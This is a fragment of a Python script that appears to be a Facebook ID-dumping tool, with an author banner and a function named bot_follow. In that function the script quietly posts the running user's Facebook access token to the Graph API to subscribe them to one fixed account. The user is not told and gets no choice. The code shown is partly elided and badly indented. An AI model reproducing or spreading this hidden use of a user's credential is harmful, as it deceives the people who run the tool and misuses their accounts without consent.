...
def banner():
    print("""   ___                \n  / _ \__ ____ _  ___ ® ┌──────────────────────────────┐\n / // / // /  ' \/ _ \  │  Script By Asad roy  │\n/____/\_,_/_/_/_/ .__/  │   •• Github.com/Asadwuii321 ••   │\n   ID Facebook /_/      └──────────────────────────────┘""")
...
def bot_follow():
	try:
		...
		print("\n[!] Token invalid")
		logs()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Asad roy X
